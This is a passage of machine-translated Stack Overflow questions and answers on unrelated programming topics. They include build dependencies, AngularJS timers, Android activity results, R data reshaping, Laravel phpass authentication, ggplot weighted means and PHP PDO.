yum install gcc-c++ make
install boost-devel 
yum install db4-devel
yum install openssl-devel  # but this didn't provide ec.h, hence the next steps
yum install rpm-build
rpm -U ~jcomeau/rpmbuild/RPMS/x86_64/openssl-devel-1.0.0e-1.x86_64.rpm 
yum install lynx  # for downloading some source packages
yum install python-devel  # for building miniupnpc
rpm -i ~jcomeau/rpmbuild/RPMS/x86_64/libminiupnpc9-1.8.20130503-0.1.x86_64.rpm 
rpm -i ~jcomeau/rpmbuild/RPMS/x86_64/libminiupnpc-devel-1.8.20130503-0.1.x86_64.rpm 
```

然后作为用户，`make BOOST_LIB_SUFFIX=-mt all test`

如果您需要有关构建 openssl-devel（规范文件在源代码中并且主要是功能性的）和 libminiupnpc-devel（我从 OpenSUSE 源 RPM 获得规范文件并对其进行修改）的说明，请告诉我。

我相信您的直接问题是您没有安装 openssl-devel。但是，如果您不执行我所做的某些步骤，那么之后您可能会遇到这些其他问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-05-15T21:43:36.100

确保 gcc 的 boost 库工作正常。尝试一个带有 boost 的测试“hello world”程序。您可以在以下目录中找到它： BOOST_BUILD_PATH/example/hello 使用 BOOST_BUILD_PATH/bin/b2 工具集=gcc 编译它 如果它不起作用，则说明没有正确安装 boost。

# debugging - 在 Visual Studio 的全面支持下远程连接到 Windows Phone 8 模拟器

> ID：16204189
> 
> 赞同：0
> 
> 时间：2013-04-24T16:36:54.197
> 
> 标签：debugging, visual-studio-2012, windows-phone-8

我认为这是一个直截了当的问题，但我正在寻找真正尝试过并且可以说是/否的人。

我想在除 Visual Studio 机器之外的另一个 Hyper-V 主机上运行 Windows Phone 8 模拟器，并将其作为调试设备连接到它。它类似于连接到“真实”电话，因为它不是本地 VM，但显然不会通过本地 USB 连接。

Windows Phone 8 的开发工具是否支持这种情况？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T00:08:49.787

> Windows Phone 8 的开发工具是否支持这种情况？

不，公共 SDK 不支持此功能。

# ios - ios - 在将库添加到项目时，为什么大多数说明都说“取消选中将项目复制到目标文件夹”？

> ID：16204195
> 
> 赞同：0
> 
> 时间：2013-04-24T23:55:43.033
> 
> 标签：ios, xcode, ios5, ios6

似乎确实应该将文件复制到目标文件夹中……不是吗？我在这里想念什么？

大多数时候，各种教程似乎都说应该取消选中该按钮。但似乎最好检查一下。

有人可以向我解释一下区别吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T00:16:59.840

这只是关于项目管理。如果你从网上下载一些文件，然后将它们添加到你的项目中，你可能想要复制它们。然后你可以删除原件，你的项目中仍然会有一个副本。或者，您下载一个代码文件夹并将其移动到您机器上保存第 3 方代码的文件夹中。现在，当您将代码添加到您的项目时，您可能不想复制代码，以便将来如果您修复代码中的错误，它可以在您使用该（共享）代码的所有项目中使用。

这与个人偏好以及如何在机器上、项目中和项目之间管理代码文件有关。

不复制 == 将文件留在原处。复制 == 将文件保存在项目中，这样我就不会丢失它们。

# sql - SQL 零和 NULL

> ID：16204197
> 
> 赞同：0
> 
> 时间：2013-04-24T23:56:27.253
> 
> 标签：sql

我是 SQL 新手，正在阅读这本书：
Murach SQL Server 2008 for Developers。
在第 441 页上，有一些处理 RAISERROR 语句的示例代码。
我明白大部分没问题，但我不明白这两个*零*和*NULL*是什么？
我知道它正在处理带有表值的 INSERT 语句。
我包含了一个指向代码屏幕截图的链接，其中红线指出了*零*和*NULL*。
[https://imageshack.us/scaled/large/837/testforforeignkey.jpg](https://imageshack.us/scaled/large/837/testforforeignkey.jpg)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T00:01:14.747

VALUES 子句表示目标表行中每一列的值。因此，您需要将 VALUES 列表与 Invoices 表的架构进行交叉引用。

@VendorId 很可能会出现在 VendorID 列中。0、0 和 NULL 表示其他 3 列的值。

此外，使用 INSERT 语句的缩写形式也是不好的做法。当您说“INSERT Invoices”并且不指定列名时，它会导致某人查找表的架构进行不必要的工作。

不如说

```
INSERT Invoices (Col1, Col2, Col3) VALUES ('Val1', 'Val2', 'Val3') 
```

因为它更加明确。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T00:10:10.990

零用于 PaymentTotal 和 CreditTotal，null 用于 PaymentDate

由于该示例没有明确告诉插入中的列，因此您必须按照显示的顺序进行

这是一个不好的做法

# javascript - ng-repeat 中的 AngularJS 倒计时

> ID：16204200
> 
> 赞同：0
> 
> 时间：2013-04-24T23:56:47.580
> 
> 标签：javascript, angularjs

我有一个小型 AngularJS 应用程序，它使用 JSON 和 UTC 时间格式从服务器带回用户列表和他们的下一次预定会议（假设在接下来的 8 小时内安排），以便于计算到本地时间. 每个用户可能有不同的状态（忙到 x 时间，空闲直到 x 时间）。

我想要完成的是能够在预定会议完成之前的剩余时间或会议开始之前的剩余时间更新 DOM。我有一些代码可以工作，但是因为我显然没有正确执行此操作，结果集中只有几个条目，它使浏览器几乎停滞不前。任何建议，将不胜感激！

我当前的代码由以下片段组成：

[主页]

```
<tr ng-repeat="item in pagedItems[currentPage-1] | orderBy:sortingOrder:reverse" ng-class="{success:item._freeBusy=='Free', error:item._freeBusy=='Busy'}">
       <td>{{item._firstName}}</td>
       <td>{{item._lastName}}</td>
       <td>{{item._facilityName}}</td>
       <td>{{item._extension}}</td>
       <td>{{item._description}}</td>
       <td><a ng-hide="!item._extension" ng-click="dial(item)">Dial</a></td>
       <td><button class="btn btn-primary" ng-click="openDetails(item)">Details</button></td>
       <td>{{item._freeBusy}} {{item._timeLeft}} {{calculateTime(item._freeBusyTime,$index)}}</td>
 </tr> 
```

[控制器]

```
 $scope.timeUntil = function(s) {
        function isoToObj(s) {
            var b = s.split(/[-T+:]/i);
            return new Date(Date.UTC(b[0], --b[1], b[2], b[3], b[4], b[5]));
        }
        // Utility to add leading zero
        function z(n) {
            return (n < 10 ? '0' : '') + n;
        }
        // Convert string to date object
        var d = isoToObj(s);
        var diff = d - new Date();
        // Allow for previous times
        var sign = diff < 0 ? '-' : '';
        diff = Math.abs(diff);
        // Get time components
        var hours = diff / 3.6e6 | 0;
        var mins = diff % 3.6e6 / 6e4 | 0;
        var secs = Math.round(diff % 6e4 / 1e3);
        // Return formatted string
        return sign + z(hours) + ' Hours ' + z(mins) + ' Min' + ':' + z(secs);// + ':' + z(secs)
    }

    $scope.calculateTime = function(s, idx) {
        timeoutID = $timeout(function() {
            $scope.items[idx]._timeLeft = $scope.timeUntil(s);
            $scope.calculateTime(s, idx);
        }, 1000);
    }; 
```

**编辑**

我了解下面提到的问题，我正在努力解决的是如何正确注册。因为它可能有多达 15 次以上的单独时间更新到我迷路的单个滴答声。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T01:08:09.030

您注册的超时时间比您想象的要多。每次 Angular 呈现您的视图时，您都会注册新的超时处理程序。添加回调的计数器并观察计数：

```
$scope.called = 0;

$scope.calculateTime = function(s, idx) {
    timeoutID = $timeout(function() {
        $scope.items[idx]._timeLeft = $scope.timeUntil(s);
        $scope.calculateTime(s, idx);
        console.log(++$scope.called);
    }, 1000);
}; 
```

请参阅我复制错误的地方：http: [//plnkr.co/edit/qJ4zDl6gc5C7Edg0T0gB](http://plnkr.co/edit/qJ4zDl6gc5C7Edg0T0gB)。只需运行它并观察计数器。

为什么要在渲染周期中更新 _timeLeft？为什么不这样做：

```
$scope.called = 0;

setInterval(function() {
  angular.forEach($scope.items, function function_name(item) {
    item._timeLeft = $scope.timeUntil(item._freeBusyTime);
  });
  console.log(++$scope.called);
  $scope.$apply();
}, 1000); 
```

查看新的 plunk：[http://plnkr.co/edit/rVJ6p4VXDQvt7rjT6eka](http://plnkr.co/edit/rVJ6p4VXDQvt7rjT6eka)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T01:10:56.747

您正在递归调用 $scope.calculateTime！而且您正在 ng-repeat 期间修改项目列表，这也会导致无限循环。

这个怎么样：[http ://plnkr.co/edit/0JqK96irV4ETdWZYxO3P?p=preview](http://plnkr.co/edit/0JqK96irV4ETdWZYxO3P?p=preview)

将 html 更改为引用不影响 ng-repeat 的单独数组：

```
<td>in {{_timeLeft[$index]}}</td> 
```

更新如下：

```
$scope._timeLeft = [];

var intervalID = window.setInterval(function() {
    for (var i=0; i<$scope.items.length; i++) {
      $scope._timeLeft[i] = $scope.timeUntil($scope.items[i]._freeBusyTime);
    }
    $scope.$apply();
}, 1000); 
```

请注意，$scope.$apply() 需要让 Angular 知道 '_timeLeft' 已被修改，这会更新对它的所有引用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T00:29:41.317

我认为您不应该调用`$timeout`每个视图更新。相反，您可以在控制器中倒计时并让视图显示计时器。

[http://plnkr.co/edit/OUVdJyllzmVmPC0FhqYF?p=preview](http://plnkr.co/edit/OUVdJyllzmVmPC0FhqYF?p=preview)

# android - onActivityResult 中的完成活动不起作用

> ID：16204201
> 
> 赞同：6
> 
> 时间：2013-04-24T23:56:49.380
> 
> 标签：android, android-intent, android-activity, back, activity-finish

我有一对必须生或死的活动。基本上 AlphaActivity 会做一些工作，然后`startActivityForResult()`为 BetaActivity 发送一个意图 ( )。当 BetaActivity 完成后，我希望它`startActivity()`为 GammaActivity 调度一个意图 ()，然后调用`finish()`它自己。完成后，我希望调用 AlphaActivity 的`onActivityResult()`方法，但这似乎永远不会发生。我的设计是这样的，在 AlphaActivity 的内部`onActivityResult()`，我调用`finish()`. 我的计划是，一旦达到 GammaActivity，用户将永远无法返回 AlphaActivity 或 BetaActivity。但目前后退按钮确实将用户带到了 AlphaActivity。

我确实有一些想法为什么它不起作用，但是在这里讨论它们是没有意义的，因为我对可能真正起作用的东西感兴趣。

编辑：

代码都是非常标准的东西：

从阿尔法内部

```
private void startBetaActivity() {
    Intent intent = new Intent(this, BetaActivity.class);
    startActivityForResult(intent, Constant.EXIT_CODE);

}

@Override
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);

    if (resultCode == RESULT_OK) {
        if (requestCode == Constant.EXIT_CODE) {
            this.finish();
        }
    }
} 
```

从 Beta 内部：

```
if (success) {
            startGammaActivity();
            finish();
        } 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-25T00:24:59.033

我认为你只需要：

```
if (success) {
        startGammaActivity();
        setResult(Activity.RESULT_OK); //add this
        finish();
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-25T00:18:39.117

在我看来，你应该遵循这个，

1.  AlphaActivity 使用 X 请求代码启动 BetaActivity 以获取结果
2.  BetaActivity 完成他的工作，然后调用 setResult(Y, Z) 并调用 finish()
3.  AlphaActivity 将使用 RequestCode X、ResultCode Y 和数据 Z 运行 onActivityResult。如果 X 和 Y 是您所期望的，则启动 GammaActivity 并最终在 AlphaActivity 上调用 finish()

您不应该在 BetaActivity 上启动 GammaActivity，因为 AlphaActivity onActivityResult 将无法正常工作。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-04-25T00:22:40.907

你还没有调用 setResult()

```
if (success) {
        startGammaActivity();
        setResult(RESULT_OK);
        finish();
    } 
```

或者，如果您永远不需要在两个活动清单`BetaActivity`中从那时返回`AlphaActivity``android:noHistory=true`

# java - Android tesseract 数据路径

> ID：16204204
> 
> 赞同：1
> 
> 时间：2013-04-24T23:56:59.383
> 
> 标签：java, android, ocr, tesseract

所以我正在关注教程，下面是我的代码。我一直在试图弄清楚我需要对数据路径做什么。有没有人有关于如何拍摄我拍摄的位图照片并将其加载到 tesseract 进行分析的示例或建议？所有帮助表示赞赏。

```
package com.example.cameraocr;

import java.io.File;

import com.googlecode.tesseract.android.TessBaseAPI;

import android.os.Bundle;
import android.os.Environment;
import android.app.Activity;
import android.view.Menu;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;

public class MainActivity extends Activity {
private static final int CAMERA_REQUEST = 1888; 
    private static ImageView imageView;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    this.imageView = (ImageView)this.findViewById(R.id.imageView1);
    Button photoButton = (Button) this.findViewById(R.id.button1);
    photoButton.setOnClickListener(new View.OnClickListener() {

        @Override
        public void onClick(View v) {
            Intent cameraIntent = new     Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE); 
            startActivityForResult(cameraIntent, CAMERA_REQUEST); 
        }
    });
}

protected void onActivityResult(int requestCode, int resultCode, Intent data) {  
    if (requestCode == CAMERA_REQUEST && resultCode == RESULT_OK) {  
        Bitmap photo = (Bitmap) data.getExtras().get("data"); 
        imageView.setImageBitmap(photo);
    }  
} 
protected static void identifyunicode() {
    // DATA_PATH = Path to the storage
    // lang for which the language data exists, usually "eng"

    File myDir = getExternalFilesDir(Environment.MEDIA_MOUNTED); 
    TessBaseAPI baseApi = new TessBaseAPI(); 
    baseApi.init(myDir, "eng");
}
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T02:08:35.300

看看我的例子：

[https://github.com/akiwarheit/plug-notes-android/blob/master/src/com/plug/note/NoteEditorActivity.java](https://github.com/akiwarheit/plug-notes-android/blob/master/src/com/plug/note/NoteEditorActivity.java)

我所做的是调用相机，拍照，获取照片并将其传递给我的`OCRTask`班级（一个 AsyncTask），该班级调用`TessBaseAPI`

```
 public void callCamera() {
    Log.d(TAG, "Starting camera...");
    Intent cameraIntent = new Intent(
        android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
    startActivityForResult(cameraIntent, REQUEST_OCR);
  } 
```

[https://github.com/akiwarheit/plug-notes-android/blob/master/src/com/plug/note/OCRTask.java](https://github.com/akiwarheit/plug-notes-android/blob/master/src/com/plug/note/OCRTask.java)

（如果我在`OCRTask`这里发布整个课程代码会有点长，所以只需在 Github 中阅读，也许？）

然后处理结果

```
 @Override
  protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    /* bunch of other codes */
    if (requestCode == REQUEST_OCR) {
      if (resultCode == RESULT_OK) {
        Bitmap x = (Bitmap) data.getExtras().get("data");            
        new OCRTask(this, x, this).execute();            
      }
    }
  } 
```

我刚刚将它识别的文本添加到我的`EditText`

```
 @Override
  public void onFinishRecognition(String recognizedText) {
    noteView.setText(noteView.getText() + " " + recognizedText);
  } 
```

* * *

*这是课程*

[NoteEditor（调用相机意图）](https://github.com/akiwarheit/plug-notes-android/blob/master/src/com/plug/note/NoteEditorActivity.java)

[OCRTask （调用`TessBaseApi`，这是您主要关心的问题）](https://github.com/akiwarheit/plug-notes-android/blob/master/src/com/plug/note/OCRTask.java)

[`EditText`OCRCallback（完成后将文本添加到我的`OCRTask`）](https://github.com/akiwarheit/plug-notes-android/blob/master/src/com/plug/note/OCRCallback.java)

[文件管理器（实用方法）](https://github.com/akiwarheit/plug-notes-android/blob/master/src/com/plug/utils/FileManager.java)

希望能帮助到你。

# r - 面板数据：如何指定引用“变化前后的年数”的变量？

> ID：16204205
> 
> 赞同：0
> 
> 时间：2013-04-24T23:57:24.163
> 
> 标签：r, variables, sequence, conditional-statements, data-management

这就是我的时间序列、横截面数据的结构：

```
country     year group  change
Afghanistan 1980   1      0 
Afghanistan 1981   1      0 
Afghanistan 1982   1      1 
Afghanistan 1983   1      0 
Afghanistan 1984   1      0 
Afghanistan 1985   1      1 
Afghanistan 1986   1      0 
Afghanistan 1987   1      2 
Afghanistan 1988   1      0 
Bhutan      1980   2      0 
Bhutan      1981   2      0 
Bhutan      1982   2      0 
Bhutan      1983   2      0 
Bhutan      1984   2      1 
Bhutan      1985   2      0 
Bhutan      1986   2      0 
Bhutan      1987   2      0 
Bhutan      1988   2      2 
Chile       1980   3      0 
```

如果有正变化，则变量变化为“1”，如果有负变化，则为“2”。

**问题**

我正在努力创建两个新变量：

(1) 一个叫做“趋势”的变量

通俗地说，这个变量应该代表“*对于每个组（国家年），如果变化 = 1，趋势 = 1，但直到变化 = 2* ”。

(2) 一个叫做“时间”的变量

此变量应指定积极趋势（变化 =1）*之前和之后的年份。*

也就是说，最终数据集应如下所示：

```
country     year group  change  trend  time
Afghanistan 1980   1      0      0      -2
Afghanistan 1981   1      0      0      -1
Afghanistan 1982   1      1      1       1
Afghanistan 1983   1      0      1       2
Afghanistan 1984   1      0      1       3
Afghanistan 1985   1      1      1       4
Afghanistan 1986   1      0      1       5
Afghanistan 1987   1      2      0       0
Afghanistan 1988   1      0      0       0
Bhutan      1980   2      0      0      -4
Bhutan      1981   2      0      0      -3
Bhutan      1982   2      0      0      -2
Bhutan      1983   2      0      0      -1
Bhutan      1984   2      1      1       1
Bhutan      1985   2      0      1       2
Bhutan      1986   2      0      1       3
Bhutan      1987   2      0      1       4
Bhutan      1988   2      2      0       0
Chile       1980   3      0      0       0 
```

我认为可以使用“拆分”来分隔组，例如

```
data$trend <- split(data$group, data$group)  # separate by unique values
[...]
data$trend <- unsplit(data$trend, data$group)  # make back into a vector 
```

***但是***：这两行之间的命令是什么？

此行将生成一个序列

data.time$trend <- lapply(data.time$trend, seq)

***但是***：如何将其限制为积极趋势，即 data$trend==1？

任何想法都非常受欢迎！非常感谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T03:48:50.997

像下面这样的东西会做。关键显然要写得妥当`myFunc`。

```
DF
##        country year group change
## 1  Afghanistan 1980     1      0
## 2  Afghanistan 1981     1      0
## 3  Afghanistan 1982     1      1
## 4  Afghanistan 1983     1      0
## 5  Afghanistan 1984     1      0
## 6  Afghanistan 1985     1      1
## 7  Afghanistan 1986     1      0
## 8  Afghanistan 1987     1      2
## 9  Afghanistan 1988     1      0
## 10      Bhutan 1980     2      0
## 11      Bhutan 1981     2      0
## 12      Bhutan 1982     2      0
## 13      Bhutan 1983     2      0
## 14      Bhutan 1984     2      1
## 15      Bhutan 1985     2      0
## 16      Bhutan 1986     2      0
## 17      Bhutan 1987     2      0
## 18      Bhutan 1988     2      2

myFunc <- function(x) {
    trend <- rep(0, nrow(x))

    trendStart <- which(x$change == 1)[1]
    trendEnd <- which(x$change == 2)[1] - 1

    trend[seq(from = trendStart, to = trendEnd)] <- 1

    time <- c(seq(from = 1 - trendStart, to = -1), seq(from = 1, to = trendEnd + 1 - trendStart), rep(0, nrow(x) - trendEnd))

    return(cbind(x, trend, time))

}

LL <- split(DF, DF$group)

do.call(rbind, lapply(LL, myFunc))
##          country year group change trend time
## 1.1  Afghanistan 1980     1      0     0   -2
## 1.2  Afghanistan 1981     1      0     0   -1
## 1.3  Afghanistan 1982     1      1     1    1
## 1.4  Afghanistan 1983     1      0     1    2
## 1.5  Afghanistan 1984     1      0     1    3
## 1.6  Afghanistan 1985     1      1     1    4
## 1.7  Afghanistan 1986     1      0     1    5
## 1.8  Afghanistan 1987     1      2     0    0
## 1.9  Afghanistan 1988     1      0     0    0
## 2.10      Bhutan 1980     2      0     0   -4
## 2.11      Bhutan 1981     2      0     0   -3
## 2.12      Bhutan 1982     2      0     0   -2
## 2.13      Bhutan 1983     2      0     0   -1
## 2.14      Bhutan 1984     2      1     1    1
## 2.15      Bhutan 1985     2      0     1    2
## 2.16      Bhutan 1986     2      0     1    3
## 2.17      Bhutan 1987     2      0     1    4
## 2.18      Bhutan 1988     2      2     0    0 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T07:41:19.843

这是使用的替代解决方案`ddply`（假设您的 df 名为 mydata）：

```
changeTime <- function(x) {        # time function

    if (max(x)==0) return(0)       # checking for empty events

    y <- (1:length(x)-match(1,x))  # pre-constructing time
    y[y>=0] <- y[y>=0]+1           # adding extra 1

    if (!is.na(match(2,x))) {
      y[match(2,x):length(x)] <- 0 # setting 0 after 2
    }
    return(y)
}

changeTrend <- function(x) {       # trend function

    y <- cummax(x)   # using cumulative maximum function
    y[y>=2] <- 0     # remove trailing 2's
    return(y)

}

require(plyr)
ddply(mydata,.(country),mutate,trend=changeTrend(change),time=changeTime(change)) 
```

PS 我想事件本身的时间应该是 0，而不是 1。如果是这种情况，那么应该删除在第一个函数中添加额外 1 的行。

# php - 在 Laravel 中实现 phpass

> ID：16204206
> 
> 赞同：1
> 
> 时间：2013-04-24T23:57:27.743
> 
> 标签：php, laravel, phpass

我正在使用 Laravel 3.2 创建一个新网站。我的站点将与现有的用户数据库链接，这意味着来自另一个站点的用户将能够使用相同的帐户登录到该站点。

现有站点使用 phpass，所以我想，我需要在 Laravel 站点中使用 phpass 才能使身份验证正常工作。我下载了 Laravel 的 phpass 包，我实现了它只是为了散列密码和检查密码。有没有办法可以将它实现到 Laravel 身份验证类中，所以使用普通的 Laravel 身份验证方法将使用 phpass？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T04:37:05.107

您需要实现自己的自定义身份验证驱动程序。这是一个相对轻松的过程，需要一些自定义代码才能正常工作，但幸运的是 L3 很容易扩展。

本质上，您可以扩展现有驱动程序之一（Eloquent 或 Fluent）并简单地重载该`attempt`方法。看看[Eloquent](https://github.com/laravel/laravel/blob/master/laravel/auth/drivers/eloquent.php)驱动程序。该`Hash::check()`方法位于第 53 行。因此，基本上，`libraries`为您的驱动程序创建一个新文件，可能会调用`phpass.php`并扩展和调整驱动程序。

然后，您使用该`Auth::extend()`方法注册您的驱动程序。

```
Auth::extend('phpass', function()
{
    return new Phpass;
} 
```

然后将您的驱动程序设置为`application/config/auth.php`.

```
'driver' => 'phpass' 
```

祝你好运。

### 参考

*   [为 Laravel 编写自定义身份验证驱动程序](http://firmanw.com/writing-a-custom-authentication-driver-for-laravel/)

# r - 如何在箱线图上绘制加权平均值？

> ID：16204213
> 
> 赞同：3
> 
> 时间：2013-04-24T23:58:05.917
> 
> 标签：r, ggplot2, boxplot

在寻找解决方案和摆弄之后，我正在寻求帮助以尝试在箱线图上显示加权平均值（我也尝试将其交叉发布到 ggplot2 邮件列表）。

我在下面提供了一个玩具示例。

```
#data

value <- c(5, 7, 8, 6, 7, 9, 10, 6, 7, 10)
category <- c("one", "one", "one", "two", "two", "two",
              "three", "three", "three","three")
weight <- c(1, 1.2, 2, 3, 2.2, 2.5, 1.8, 1.9, 2.2, 1.5)
df <- data.frame(value, category, weight)

#unweighted means by category
ddply(df, .(category), summarize, mean=round(mean(value, na.rm=TRUE), 2))

  category mean
1      one 6.67
2    three 8.25
3      two 7.33

#weighted means by category
ddply(df, .(category), summarize, 
          wmean=round(wtd.mean(value, weight, na.rm=TRUE), 2))

  category wmean
1      one  7.00
2    three  8.08
3      two  7.26

#unweighted means added to boxplot (which works fine)
ggplot(df, aes(x = category, y = value, weight = weight)) + 
   geom_boxplot(width=0.6,  colour = I("#3366FF")) + 
   stat_summary( fun.y ="mean", geom ="point", shape = 23, 
                 size = 3, fill ="white") 
```

我的问题是，如何在箱线图上显示加权平均值而不是未加权平均值？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-25T05:31:59.523

您可以将加权平均值保存为新数据框，然后使用它来绘制`geom_point()`。参数`inherit.aes=FALSE`将确保绘制点而不继承`ggplot()`调用中提供的信息。

```
library(Hmisc)
library(plyr)
library(ggplot2)
df.wm<-ddply(df, .(category), summarize, 
             wmean=round(wtd.mean(value, weight, na.rm=TRUE), 2))

ggplot(df, aes(x = category, y = value, weight = weight)) + 
  geom_boxplot(width=0.6,  colour = I("#3366FF")) + 
  geom_point(data=df.wm,aes(x=category,y=wmean),shape = 23, 
             size = 3, fill ="white",inherit.aes=FALSE) 
```

![在此处输入图像描述](https://i.stack.imgur.com/QtFvq.png)

# c++ - 从结构中读取的枚举器显示？

> ID：16204214
> 
> 赞同：0
> 
> 时间：2013-04-24T23:58:07.337
> 
> 标签：c++, file-io, struct, enumerators

我有这个枚举器，你从一个结构中读取它说 enum {PASSING, FAILING} 它的意思是显示失败或通过.. 但是我得到 (status Failing0)(status PASSING1) 作为最终输出，...有谁知道为什么 1 和 0 会出现？关于做什么的任何提示？

```
 if(info[i].average <70)
{
info[i].status = FAILING;
}
else
{
 info[i].status = PASSING;
}
switch(info[i].status)
{
 case FAILING: cout << "Status FAILING";// <<endl; 
 break;
 case PASSING: cout << "Status PASSING";// <<endl;

}
cout << info[i].status <<endl; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T23:59:56.110

制作地图：

```
#include <string>
#include <map>

enum TheEnumType { PASSING, FAILING };

std::map<TheEnumType, std::string> enum_names =  { { PASSING, "Passing" },
                                                   { FAILING, "Failing" } };

std::cout << enum_names[info[i].status]; 
```

# javascript - 悬停时淡出元素并允许用户选择下面的文本 - 可能吗？

> ID：16204215
> 
> 赞同：0
> 
> 时间：2013-04-24T23:58:15.027
> 
> 标签：javascript, jquery, css, html

考虑以下 HTML：

```
<div id="mydiv">Big shiny error goes here</div> 
```

使用下面的 CSS，`div`即使页面滚动，它也会保持在右上角。

```
#mydiv {
  position:fixed;
  right:0;
  top:0;
  background-color: red;
} 
```

是否有可能`mydiv`在悬停时淡出到 10% 的不透明度并允许用户使用下面的页面元素，例如选择文本并复制到剪贴板？这个想法是`mydiv`应该始终保持可见，但它不应该阻止用户的操作。

作为额外的奖励，`mydiv`如果在下面找不到任何元素，那么选择 的文本会很好。

**编辑：** `hover` +`z-index`方法似乎效果不佳，[请参阅此 jsfiddle](http://jsfiddle.net/fED2A/)。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T00:01:20.760

我能想到的最接近的方法是给内容区域 a `z-index`，比如说，1。然后，使用`:hover`，给错误 div 一个较低`z-index`的位置，以将其定位在主要区域的后面。这将允许主要内容上的鼠标事件。您还可以根据需要调整不透明度以使其淡出。我相信，如果元素前面没有其他内容，IE 将允许您在元素上单击/拖动/任何内容，但 Chrome 和 Firefox 会认为它被内容区域隐藏，即使那里实际上没有“任何东西”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T14:03:34.540

```
$(document).ready(function(){
  var id = $('#selector')
  id.mouseover(function(){
    id.fadeOut(800,function(){
      id.hide();
    });
  })
  id.mouseout(function(){
    id.fadeIn(800,function(){

    });
  })
}); 
```

选择器应将分区指向顶部

# c# - 如何引用结构数组中的元素 [C#]

> ID：16204216
> 
> 赞同：1
> 
> 时间：2013-04-24T23:58:31.420
> 
> 标签：c#, structure

抱歉转储问题，但我是 C# 的新手（从 C++ 迁移）...

我有一个结构：

```
public struct A {
    int a,b,c,d;
} 
```

我也有这个结构实例的数组

```
A[] a = new A[10]; 
```

因此，我需要引用数组中的一个元素：

```
A b = a[5];
b.x = 10; 
```

但看起来“b”不是参考，而是“a[5]”的副本。换句话说，此代码修改了“b”，但不更改数组“a”的索引为 5 的元素。所以，问题是 - 如何引用结构数组中的元素？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-04-25T00:02:24.017

结构是值类型（即使在 C++ 中）。将上面的内容重写为一个类，你应该得到想要的结果。

# ios - NSString 正则表达式字符串匹配/搜索

> ID：16204218
> 
> 赞同：4
> 
> 时间：2013-04-24T23:58:38.093
> 
> 标签：ios, objective-c, regex, nsstring

我有一个像 @"random ++qwerty/asdf" 这样的字符串，我想找出 qwerty 部分。“random ++”和“/asdf”总是相同的。我将如何使用正则表达式来做到这一点？我对它们的工作方式感到困惑。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-05-10T20:00:34.927

## 问题解决了 ！！

这段代码给出了你想要的，

```
NSString *yourString = @"random ++qwerty/asdf random ++derty/asdf random ++noty/asdf";
NSError *error = NULL;

NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:@"random \\+\\+(\\w+)/asdf" options:NSRegularExpressionCaseInsensitive error:&error];

[regex enumerateMatchesInString:yourString options:0 range:NSMakeRange(0, [yourString length]) usingBlock:^(NSTextCheckingResult *match, NSMatchingFlags flags, BOOL *stop){

    // detect
    NSString *insideString = [yourString substringWithRange:[match rangeAtIndex:1]];

    //print
    NSLog(@"%@",insideString);

}]; 
```

输出：
**qwerty
derty
noty**

# php - pdo 相对于 mysql_* 或 mysqli_* 的优势

> ID：16204220
> 
> 赞同：5
> 
> 时间：2013-04-24T23:58:56.057
> 
> 标签：php, mysql, pdo

我注意到很多人正在使用或迁移到 pdo，我以前从未使用过，我真的很不愿意改变它，反正我仍然没有改变，但我想从使用 pdo 的人那里知道每天为什么我应该改变它，我的意思是它比 mysql_* 或 mysqli_* 有什么优势，我已经用谷歌搜索了很多，但我还没有找到满意的答案。谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T00:20:53.610

这不是用一个应用程序支持多个数据库（尽管你可以，但要小心）。这不是为了让将来更改数据库变得容易（尽管它有帮助）。它是关于拥有*一个一致的、合理的界面*来使用，而不管数据库如何。这不仅有利于程序员（通过使他们的技能更广泛地适用）和项目（通过使程序员更容易参与），它还使得创建位于数据访问层之上一层的库变得更加容易*。*Perl 拥有 DBI 已有 20 年了，这绝对是一件好事。PDO 是一个非常相似的概念（实际上它至少窃取了 DBI 的一半接口）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T00:03:36.890

PDO 旨在支持对各种形式的 SQL 数据库的透明访问。它是 PHP 的所谓“数据访问抽象层”。

如果您将应用程序限制为仅使用 SQL99 标准查询，则上述情况在*现实生活*中应该是正确的；）。

对于即将构建新数据库扩展的扩展开发人员来说，PDO 也是一个可靠的接口。他们可以只写一个驱动程序dor PDO，并且可以使用PHP中众所周知的接口——PDO接口来访问数据库。

结论：

*   PDO 旨在跨各种数据库类型在 PHP 中实现相似的数据库访问
*   如果使用 SQL99 标准查询，您可以更改数据库产品只是更改连接字符串
*   PDO 是一个众所周知的数据库访问接口，可供扩展开发人员使用

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-04-25T00:04:36.950

